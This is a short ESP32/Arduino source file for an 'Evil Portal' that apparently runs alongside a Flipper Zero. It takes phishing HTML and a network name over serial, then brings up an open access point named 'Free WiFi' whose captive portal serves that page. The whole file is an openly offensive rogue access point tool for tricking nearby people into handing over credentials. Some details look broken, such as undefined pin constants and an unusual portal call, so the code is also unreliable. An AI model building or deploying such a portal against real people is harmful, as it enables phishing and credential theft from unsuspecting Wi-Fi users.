#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include "CommandLine.h"
#include <WiFiManager.h>

#define MAX_HTML_SIZE 20000
#define SD_CS 10

WiFiManager wifiManager;

class EvilPortal {
private:
  char ssid[100] = "Free WiFi";
  const char *password;
  bool has_html = false;
  bool has_ap = false;
  char HTML[MAX_HTML_SIZE] = "";

public:
  EvilPortal() {
  };

  void begin() {
    if (!wifiManager.startConfigPortal(ssid, NULL, HTML)) {
      Serial.println("failed to connect and hit timeout");
      delay(3000);
      return;
    }

    Serial.printf("Evil Portal Started at %s", WiFi.softAPIP().toString().c_str());
  }

  void loop(CommandLine CLI) {
    while (!has_html || !has_ap) {
      if (Serial.available() > 0) {
        String flipperMessage = Serial.readString();
        const char *serialMessage = flipperMessage.c_str();
        if (strncmp(serialMessage, "sethtml=", strlen("sethtml=")) == 0) {
          Serial.println("Found HTML Tag");
          serialMessage += strlen("sethtml=");
          strncpy(HTML, serialMessage, strlen(serialMessage) - 1);
          has_html = true;
          Serial.println("html set");
        }
        else if (strncmp(serialMessage, "setap=", strlen("setap=")) == 0) {
          Serial.println("Found Acess Point Tag");
          serialMessage += strlen("setap=");
          strncpy(ssid, serialMessage, strlen(serialMessage) - 1);
          has_ap = true;
          Serial.println("ap set");
        }
        else if (strncmp(serialMessage, "reset", strlen("reset")) == 0) 
        {
          Serial.println("reset Tag Found Rebooting");
          delay(1000);
          esp_restart();
        }
        else 
        {
          CLI.loop(flipperMessage);
        }
      }
    }
    digitalWrite(B_PIN, LOW);
    digitalWrite(R_PIN, LOW);
    Serial.println("all set");
    begin();
  }
};